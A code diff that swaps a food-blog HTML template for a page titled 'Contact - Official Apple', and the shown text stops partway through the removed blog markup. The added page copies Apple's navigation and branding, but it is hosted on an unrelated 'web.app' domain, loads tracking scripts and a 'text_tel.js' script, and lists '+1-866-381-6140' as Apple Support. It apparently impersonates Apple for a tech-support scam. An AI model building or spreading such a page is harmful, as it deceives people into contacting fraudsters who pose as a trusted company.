@@ -1,835 +1,383 @@
-<?php
-?>
-<!DOCTYPE html>
-<html lang="zxx">
-
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-    <meta charset="UTF-8">
-    <meta name="description" content="Foodeiblog Template">
-    <meta name="keywords" content="Foodeiblog, unica, creative, html">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Foodeiblog | Template</title>
+  <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5039569,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039569&101" alt="counter create hit" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MRVHLH4QHS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-    <!-- Google Font -->
-    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300,400,600,700,800,900&display=swap"
-        rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css?family=Unna:400,700&display=swap" rel="stylesheet">
+  gtag('config', 'G-MRVHLH4QHS');
+</script>
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-    <!-- Css Styles -->
-    <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css">
-    <link rel="stylesheet" href="css/font-awesome.min.css" type="text/css">
-    <link rel="stylesheet" href="css/elegant-icons.css" type="text/css">
-    <link rel="stylesheet" href="css/owl.carousel.min.css" type="text/css">
-    <link rel="stylesheet" href="css/slicknav.min.css" type="text/css">
-    <link rel="stylesheet" href="css/style.css" type="text/css">
 </head>
 
 <body>
-    <!-- Page Preloder -->
-    <div id="preloder">
-        <div class="loader"></div>
-    </div>
-
-    <!-- Humberger Begin -->
-    <div class="humberger__menu__overlay"></div>
-    <div class="humberger__menu__wrapper">
-        <div class="humberger__menu__logo">
-            <a href="./index.html"><img src="img/humberger/humberger-logo.png" alt=""></a>
-        </div>
-        <nav class="humberger__menu__nav mobile-menu">
-            <ul>
-                <li><a href="./index.html">Home</a></li>
-                <li><a href="#">Recipes</a></li>
-                <li><a href="#">Dinner</a></li>
-                <li><a href="#">Desserts</a></li>
-                <li class="dropdown"><a href="#">Pages</a>
-                    <ul class="dropdown__menu">
-                        <li><a href="./categories-grid.html">Categories Grid</a></li>
-                        <li><a href="./categories-list.html">Categories List</a></li>
-                        <li><a href="./single-post.html">Single Post</a></li>
-                        <li><a href="./signin.html">Sign In</a></li>
-                        <li><a href="./404.html">404</a></li>
-                        <li><a href="./typography.html">Typography</a></li>
-                    </ul>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
                 </li>
-                <li><a href="./about.html">About</a></li>
-                <li><a href="./contact.html">Contact</a></li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
             </ul>
-        </nav>
-        <div id="mobile-menu-wrap"></div>
-        <div class="humberger__menu__about">
-            <div class="humberger__menu__title sidebar__item__title">
-                <h6>About me</h6>
-            </div>
-            <img src="img/humberger/humberger-about.jpg" alt="">
-            <h6>Hi every one! I,m Lena Mollein.</h6>
-            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et
-                dolore magna aliqua.</p>
-            <div class="humberger__menu__about__social sidebar__item__follow__links">
-                <a href="#"><i class="fa fa-facebook"></i></a>
-                <a href="#"><i class="fa fa-twitter"></i></a>
-                <a href="#"><i class="fa fa-youtube-play"></i></a>
-                <a href="#"><i class="fa fa-instagram"></i></a>
-                <a href="#"><i class="fa fa-envelope-o"></i></a>
-            </div>
-        </div>
-        <div class="humberger__menu__subscribe">
-            <div class="humberger__menu__title sidebar__item__title">
-                <h6>Subscribe</h6>
-            </div>
-            <p>Subscribe to our newsletter and get our newest updates right on your inbox.</p>
-            <form action="#">
-                <input type="text" class="email-input" placeholder="Your email">
-                <label for="agree-check">
-                    I agree to the terms & conditions
-                    <input type="checkbox" id="agree-check">
-                    <span class="checkmark"></span>
-                </label>
-                <button type="submit" class="site-btn">Subscribe</button>
-            </form>
-        </div>
-    </div>
-    <!-- Humberger End -->
-
-    <!-- Header Section Begin -->
-    <header class="header">
-        <div class="header__top">
-            <div class="container">
-                <div class="row">
-                    <div class="col-lg-2 col-md-1 col-6 order-md-1 order-1">
-                        <div class="header__humberger">
-                            <i class="fa fa-bars humberger__open"></i>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
                         </div>
-                    </div>
-                    <div class="col-lg-8 col-md-10 order-md-2 order-3">
-                        <nav class="header__menu">
-                            <ul>
-                                <li class="active"><a href="./index.html">Home</a></li>
-                                <li><a href="#">Recipes</a>
-                                    <div class="header__megamenu__wrapper">
-                                        <div class="header__megamenu">
-                                            <div class="header__megamenu__item">
-                                                <div class="header__megamenu__item--pic set-bg"
-                                                    data-setbg="img/megamenu/p-1.jpg">
-                                                    <div class="label">Vegan</div>
-                                                </div>
-                                                <div class="header__megamenu__item--text">
-                                                    <h5><a href="#">How to Make a Milkshake With Any Ice Cream ...</a>
-                                                    </h5>
-                                                </div>
-                                            </div>
-                                            <div class="header__megamenu__item">
-                                                <div class="header__megamenu__item--pic set-bg"
-                                                    data-setbg="img/megamenu/p-2.jpg">
-                                                    <div class="label">Vegan</div>
-                                                </div>
-                                                <div class="header__megamenu__item--text">
-                                                    <h5><a href="#">How to Make a Milkshake With Any Ice Cream ...</a>
-                                                    </h5>
-                                                </div>
-                                            </div>
-                                            <div class="header__megamenu__item">
-                                                <div class="header__megamenu__item--pic set-bg"
-                                                    data-setbg="img/megamenu/p-3.jpg">
-                                                    <div class="label">Vegan</div>
-                                                </div>
-                                                <div class="header__megamenu__item--text">
-                                                    <h5><a href="#">How to Make a Milkshake With Any Ice Cream ...</a>
-                                                    </h5>
-                                                </div>
-                                            </div>
-                                            <div class="header__megamenu__item">
-                                                <div class="header__megamenu__item--pic set-bg"
-                                                    data-setbg="img/megamenu/p-4.jpg">
-                                                    <div class="label">Vegan</div>
-                                                </div>
-                                                <div class="header__megamenu__item--text">
-                                                    <h5><a href="#">How to Make a Milkshake With Any Ice Cream ...</a>
-                                                    </h5>
-                                                </div>
-                                            </div>
-                                            <div class="header__megamenu__item">
-                                                <div class="header__megamenu__item--pic set-bg"
-                                                    data-setbg="img/megamenu/p-5.jpg">
-                                                    <div class="label">Vegan</div>
-                                                </div>
-                                                <div class="header__megamenu__item--text">
-                                                    <h5><a href="#">How to Make a Milkshake With Any Ice Cream ...</a>
-                                                    </h5>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-866-381-6140 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
                                 </li>
-                                <li><a href="#">Dinner</a></li>
-                                <li><a href="#">Desserts</a></li>
-                                <li class="dropdown"><a href="#">Pages</a>
-                                    <ul class="dropdown__menu">
-                                        <li><a href="./categories-grid.html">Categories Grid</a></li>
-                                        <li><a href="./categories-list.html">Categories List</a></li>
-                                        <li><a href="./single-post.html">Single Post</a></li>
-                                        <li><a href="./signin.html">Sign In</a></li>
-                                        <li><a href="./404.html">404</a></li>
-                                        <li><a href="./typography.html">Typography</a></li>
-                                    </ul>
-                                </li>
-                                <li><a href="./about.html">About</a></li>
-                                <li><a href="./contact.html">Contact</a></li>
                             </ul>
-                        </nav>
-                    </div>
-                    <div class="col-lg-2 col-md-1 col-6 order-md-3 order-2">
-                        <div class="header__search">
-                            <i class="fa fa-search search-switch"></i>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
                         </div>
                     </div>
                 </div>
             </div>
-        </div>
-        <div class="container">
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
             <div class="row">
-                <div class="col-lg-3 col-md-3">
-                    <div class="header__btn">
-                        <a href="./signin.html" class="primary-btn">Subscribe</a>
-                    </div>
-                </div>
-                <div class="col-lg-6 col-md-6">
-                    <div class="header__logo">
-                        <a href="./index.html"><img src="img/logo.png" alt=""></a>
-                    </div>
-                </div>
-                <div class="col-lg-3 col-md-3">
-                    <div class="header__social">
-                        <a href="#"><i class="fa fa-facebook"></i></a>
-                        <a href="#"><i class="fa fa-twitter"></i></a>
-                        <a href="#"><i class="fa fa-youtube-play"></i></a>
-                        <a href="#"><i class="fa fa-instagram"></i></a>
-                        <a href="#"><i class="fa fa-envelope-o"></i></a>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </header>
-    <!-- Header Section End -->
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-    <!-- Hero Section Begin -->
-    <section class="hero">
-        <div class="hero__slider owl-carousel">
-            <div class="hero__item">
-                <div class="container-fluid">
-                    <div class="row">
-                        <div class="col-lg-6 p-0">
-                            <div class="hero__inside__item hero__inside__item--wide set-bg"
-                                data-setbg="img/hero/hero-1.jpg">
-                                <div class="hero__inside__item__text">
-                                    <div class="hero__inside__item--meta">
-                                        <span>08</span>
-                                        <p>Aug</p>
-                                    </div>
-                                    <div class="hero__inside__item--text">
-                                        <ul class="label">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h4>Vegan White Peach Mug Cobbler With CardamomVegan<br /> White Peach Mug
-                                            Cobbler With Cardamom</h4>
-                                        <ul class="widget">
-                                            <li>by <span>Admin</span></li>
-                                            <li>3 min read</li>
-                                            <li>20 Comment</li>
-                                        </ul>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-6  p-0">
-                            <div class="hero__inside__item hero__inside__item--small set-bg"
-                                data-setbg="img/hero/hero-2.jpg">
-                                <div class="hero__inside__item__text">
-                                    <div class="hero__inside__item--meta">
-                                        <span>08</span>
-                                        <p>Aug</p>
-                                    </div>
-                                    <div class="hero__inside__item--text">
-                                        <ul class="label">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h5>How to Make a Milkshake With Any <br />Ice Cream, Any Toppings...</h5>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="hero__inside__item hero__inside__item--small set-bg"
-                                data-setbg="img/hero/hero-3.jpg">
-                                <div class="hero__inside__item__text">
-                                    <div class="hero__inside__item--meta">
-                                        <span>08</span>
-                                        <p>Aug</p>
-                                    </div>
-                                    <div class="hero__inside__item--text">
-                                        <ul class="label">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h5>Vintage Copper Preserve Pan with <br />Brass Handles, Mid 19th Century</h5>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-6  p-0">
-                            <div class="hero__inside__item set-bg" data-setbg="img/hero/hero-4.jpg">
-                                <div class="hero__inside__item__text">
-                                    <div class="hero__inside__item--meta">
-                                        <span>08</span>
-                                        <p>Aug</p>
-                                    </div>
-                                    <div class="hero__inside__item--text">
-                                        <ul class="label">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h5>Marinated Lentil Salad with Zucch <br />ini and Tomatoes</h5>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="hero__item">
-                <div class="container-fluid">
-                    <div class="row">
-                        <div class="col-lg-6 p-0">
-                            <div class="hero__inside__item hero__inside__item--wide set-bg"
-                                data-setbg="img/hero/hero-1.jpg">
-                                <div class="hero__inside__item__text">
-                                    <div class="hero__inside__item--meta">
-                                        <span>08</span>
-                                        <p>Aug</p>
-                                    </div>
-                                    <div class="hero__inside__item--text">
-                                        <ul class="label">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h4>Vegan White Peach Mug Cobbler With CardamomVegan<br /> White Peach Mug
-                                            Cobbler With Cardamom</h4>
-                                        <ul class="widget">
-                                            <li>by <span>Admin</span></li>
-                                            <li>3 min read</li>
-                                            <li>20 Comment</li>
-                                        </ul>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-6 p-0">
-                            <div class="hero__inside__item hero__inside__item--small set-bg"
-                                data-setbg="img/hero/hero-3.jpg">
-                                <div class="hero__inside__item__text">
-                                    <div class="hero__inside__item--meta">
-                                        <span>08</span>
-                                        <p>Aug</p>
-                                    </div>
-                                    <div class="hero__inside__item--text">
-                                        <ul class="label">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h5>How to Make a Milkshake With Any <br />Ice Cream, Any Toppings...</h5>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="hero__inside__item hero__inside__item--small set-bg"
-                                data-setbg="img/hero/hero-2.jpg">
-                                <div class="hero__inside__item__text">
-                                    <div class="hero__inside__item--meta">
-                                        <span>08</span>
-                                        <p>Aug</p>
-                                    </div>
-                                    <div class="hero__inside__item--text">
-                                        <ul class="label">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h5>Vintage Copper Preserve Pan with <br />Brass Handles, Mid 19th Century</h5>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-6 p-0">
-                            <div class="hero__inside__item set-bg" data-setbg="img/hero/hero-4.jpg">
-                                <div class="hero__inside__item__text">
-                                    <div class="hero__inside__item--meta">
-                                        <span>08</span>
-                                        <p>Aug</p>
-                                    </div>
-                                    <div class="hero__inside__item--text">
-                                        <ul class="label">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h5>Marinated Lentil Salad with Zucch <br />ini and Tomatoes</h5>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Hero Section End -->
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-    <!-- Categories Section Begin -->
-    <section class="categories spad">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-3 col-md-6 col-sm-6">
-                    <div class="categories__item set-bg" data-setbg="img/categories/cat-1.jpg">
-                        <div class="categories__hover__text">
-                            <h5>Dinner</h5>
-                            <p>28 articles</p>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
                         </div>
                     </div>
-                </div>
-                <div class="col-lg-3 col-md-6 col-sm-6">
-                    <div class="categories__item set-bg" data-setbg="img/categories/cat-2.jpg">
-                        <div class="categories__hover__text">
-                            <h5>Dinner</h5>
-                            <p>28 articles</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-3 col-md-6 col-sm-6">
-                    <div class="categories__item set-bg" data-setbg="img/categories/cat-3.jpg">
-                        <div class="categories__hover__text">
-                            <h5>Dinner</h5>
-                            <p>28 articles</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-3 col-md-6 col-sm-6">
-                    <div class="categories__item set-bg" data-setbg="img/categories/cat-4.jpg">
-                        <div class="categories__hover__text">
-                            <h5>Dinner</h5>
-                            <p>28 articles</p>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
                         </div>
                     </div>
                 </div>
             </div>
-        </div>
-        <div class="categories__post">
-            <div class="container">
-                <div class="row">
-                    <div class="col-lg-8 col-md-8">
-                        <div class="categories__post__item categories__post__item--large">
-                            <div class="categories__post__item__pic set-bg"
-                                data-setbg="img/categories/categories-post/cp-1.jpg">
-                                <div class="post__meta">
-                                    <h4>08</h4>
-                                    <span>Aug</span>
-                                </div>
-                            </div>
-                            <div class="categories__post__item__text">
-                                <ul class="post__label--large">
-                                    <li>Vegan</li>
-                                    <li>Desserts</li>
-                                </ul>
-                                <h3><a href="#">The Absolute Best Way to Cook Steak Perfectly, According to Wayyy Too
-                                        Many Tests</a></h3>
-                                <ul class="post__widget">
-                                    <li>by <span>Admin</span></li>
-                                    <li>3 min read</li>
-                                    <li>20 Comment</li>
-                                </ul>
-                                <p>Dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut
-                                    labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation
-                                    ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in
-                                    reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur
-                                    excepteur sint ...</p>
-                                <a href="#" class="primary-btn">Read more</a>
-                                <div class="post__social">
-                                    <span>Share</span>
-                                    <a href="#"><i class="fa fa-facebook"></i> <span>82</span></a>
-                                    <a href="#"><i class="fa fa-twitter"></i> <span>24</span></a>
-                                    <a href="#"><i class="fa fa-envelope-o"></i> <span>08</span></a>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="row">
-                            <div class="col-lg-6 col-md-6 col-sm-6">
-                                <div class="categories__post__item">
-                                    <div class="categories__post__item__pic small__item set-bg"
-                                        data-setbg="img/categories/categories-post/cp-2.jpg">
-                                        <div class="post__meta">
-                                            <h4>08</h4>
-                                            <span>Aug</span>
-                                        </div>
-                                    </div>
-                                    <div class="categories__post__item__text">
-                                        <span class="post__label">Recipe</span>
-                                        <h3><a href="#">The Best Weeknight Baked Potatoes, 3 Creative Ways</a></h3>
-                                        <ul class="post__widget">
-                                            <li>by <span>Admin</span></li>
-                                            <li>3 min read</li>
-                                            <li>20 Comment</li>
-                                        </ul>
-                                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
-                                            tempor incididunt dolore magna aliqua. Quis ipsum suspendisse ultrices
-                                            gravida...</p>
-                                    </div>
-                                </div>
-                                <div class="categories__post__item">
-                                    <div class="categories__post__item__pic set-bg"
-                                        data-setbg="img/categories/categories-post/cp-4.jpg">
-                                        <div class="post__meta">
-                                            <h4>08</h4>
-                                            <span>Aug</span>
-                                        </div>
-                                    </div>
-                                    <div class="categories__post__item__text">
-                                        <ul class="post__label--large">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h3><a href="#">The Best Grass Stain Remover Is Already In Your Pantry</a></h3>
-                                        <ul class="post__widget">
-                                            <li>by <span>Admin</span></li>
-                                            <li>3 min read</li>
-                                            <li>20 Comment</li>
-                                        </ul>
-                                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
-                                            tempor incididunt dolore magna aliqua. Quis ipsum suspendisse ultrices
-                                            gravida...</p>
-                                    </div>
-                                </div>
-                                <div class="categories__post__item__plain set-bg"
-                                    data-setbg="img/categories/categories-post/cp-6.jpg">
-                                    <div class="categories__post__item__text">
-                                        <div class="post__meta">
-                                            <h4>08</h4>
-                                            <span>Aug</span>
-                                        </div>
-                                        <ul class="post__label--large">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h3><a href="#">This Summer Snacking Cake Is theSweetest Excuse to...</a></h3>
-                                        <div class="post__social">
-                                            <span>Share</span>
-                                            <a href="#"><i class="fa fa-facebook"></i> <span>82</span></a>
-                                            <a href="#"><i class="fa fa-twitter"></i> <span>24</span></a>
-                                            <a href="#"><i class="fa fa-envelope-o"></i> <span>08</span></a>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="categories__post__item">
-                                    <div class="categories__post__item__pic smaller__large set-bg"
-                                        data-setbg="img/categories/categories-post/cp-8.jpg">
-                                        <div class="post__meta">
-                                            <h4>08</h4>
-                                            <span>Aug</span>
-                                        </div>
-                                    </div>
-                                    <div class="categories__post__item__text">
-                                        <span class="post__label">Smoothie</span>
-                                        <h3><a href="#">This 2-Ingredient Spread Makes Any Egg Sandwich So Much
-                                                Better</a></h3>
-                                        <ul class="post__widget">
-                                            <li>by <span>Admin</span></li>
-                                            <li>3 min read</li>
-                                            <li>20 Comment</li>
-                                        </ul>
-                                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
-                                            tempor incididunt dolore magna aliqua. Quis ipsum suspendisse ultrices
-                                            gravida...</p>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-6 col-md-6 col-sm-6">
-                                <div class="categories__post__item">
-                                    <div class="categories__post__item__pic smaller__large set-bg"
-                                        data-setbg="img/categories/categories-post/cp-3.jpg">
-                                        <div class="post__meta">
-                                            <h4>08</h4>
-                                            <span>Aug</span>
-                                        </div>
-                                    </div>
-                                    <div class="categories__post__item__text">
-                                        <span class="post__label">Dinner</span>
-                                        <h3><a href="#">17 Perfect Gifts for Your Vegan Friend Because Sometimes...</a>
-                                        </h3>
-                                        <ul class="post__widget">
-                                            <li>by <span>Admin</span></li>
-                                            <li>3 min read</li>
-                                            <li>20 Comment</li>
-                                        </ul>
-                                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
-                                            tempor incididunt dolore magna aliqua. Quis ipsum suspendisse ultrices
-                                            gravida...</p>
-                                    </div>
-                                </div>
-                                <div class="categories__post__item__small">
-                                    <img src="img/categories/categories-post/quote.png" alt="">
-                                    <p>Lorem ipsum dolor amet, consectetur adipiscing elit, sed do eiusmod tempor
-                                        incididunt labore et dolore magna aliqua gravida.</p>
-                                    <div class="posted__by">Elena T.Jaivy</div>
-                                </div>
-                                <div class="categories__post__item">
-                                    <div class="categories__post__item__pic smaller__large set-bg"
-                                        data-setbg="img/categories/categories-post/cp-5.jpg">
-                                        <div class="post__meta">
-                                            <h4>08</h4>
-                                            <span>Aug</span>
-                                        </div>
-                                    </div>
-                                    <div class="categories__post__item__text">
-                                        <span class="post__label">Drinks</span>
-                                        <h3><a href="#">A 5-Minute Peach Mug Cobbler That Just So Happens to...</a></h3>
-                                        <ul class="post__widget">
-                                            <li>by <span>Admin</span></li>
-                                            <li>3 min read</li>
-                                            <li>20 Comment</li>
-                                        </ul>
-                                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
